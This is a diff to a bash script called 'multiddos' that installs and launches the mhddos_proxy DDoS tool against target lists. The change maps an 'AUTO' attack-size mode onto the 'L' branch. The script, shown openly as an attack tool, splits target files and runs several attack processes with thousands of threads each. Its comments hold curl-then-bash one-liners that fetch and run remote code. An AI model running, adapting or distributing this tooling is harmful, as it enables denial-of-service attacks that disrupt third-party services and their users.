@@ -1,7 +1,7 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v1.2a\n"
+clear && echo -e "Loading... v1.2b\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq git toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
@@ -167,8 +167,6 @@ else
     cd ~/multidd/mhddos_proxy
     python3 -m pip install -r requirements.txt
 
-    if [[ $ddos_size == "AUTO" ]]; then ddos_size="L"; fi #old mhddos_proxy doesn't have "auto" mode, so it's converted to "L"
-
     if [[ $ddos_size == "XS" ]]; then
         tail -n 1000 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/lite_targets.txt $methods -t 1000 $args_to_pass &
@@ -180,7 +178,7 @@ else
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 2000 $args_to_pass &
         sleep 30
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 2000 $args_to_pass &
-    elif [[ $ddos_size == "L" ]]; then
+    elif [[ $ddos_size == "L" ]] || [[ $ddos_size == "AUTO" ]]; then
         cd ~/multidd/targets/; split -n l/2 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 2 parts
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 4000 $args_to_pass &
         sleep 30
